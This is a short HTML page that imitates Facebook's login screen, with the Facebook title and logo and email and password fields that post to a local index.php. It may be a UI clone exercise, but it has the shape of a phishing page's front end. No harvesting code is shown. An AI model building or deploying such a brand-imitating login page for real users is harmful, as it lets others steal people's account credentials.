<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook Login Form</title>
</head>
<body>
    <div class="container">
        <div class="img">
            <img src="fb.png" alt="Facebook logo">
        </div>

        <form action="index.php" method="post">
            <p>Login To Facebook</p>
            <input type="text" name="email" id="username" placeholder="Name or phone number" required class="input">
            <input type="password" name="pass" id="password" placeholder="Password" required class="input">
            <button class="btn-1" onclick="validate()">Log in</button>
            <a href="#">Forgotten account?</a>
            <span>or</span>
            <div class="btn">
                <button>Create New Account</button>
            </div>
        </form>
    </div>

    <script src="index.js"></script>
</body>
</html>
